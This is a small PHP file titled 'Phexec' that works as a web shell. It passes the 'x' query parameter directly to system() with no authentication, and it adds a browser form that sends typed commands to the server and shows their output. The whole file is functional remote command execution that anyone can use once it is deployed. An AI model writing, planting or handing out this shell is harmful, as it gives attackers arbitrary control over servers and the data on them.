<?php
/*
 * Copyright (C) 2014 Maikel Linke
 *
 */

if (isset($_GET['x'])) {
    system($_GET['x']);
    exit;
}
?>
<!DOCTYPE html>
<html>
    <head>
        <title>Phexec</title>
        <meta charset="UTF-8">
        <style>
            textarea, input {
                width: 100%;
            }
            textarea {
                resize: vertical;
            }
        </style>
        <script>
            window.onload = function () {
                var form = document.getElementById('form');
                form.onsubmit = send;
                var input = document.getElementById('input');
                input.focus();
                document.input = input;
                document.textarea = document.getElementById('textarea');
            };

            function send() {
                var http = new XMLHttpRequest();
                var command = encodeURI(input.value);
                http.open('GET', 'phexec.php?x=' + command, false);
                http.send(null);
                textarea.value = http.responseText;
                input.value = '';
                return false;
            }
        </script>
    </head>
    <body>
        <form id="form">
            <textarea readonly id="textarea"></textarea>
            <input type="text" id="input"/>
        </form>
    </body>
</html>
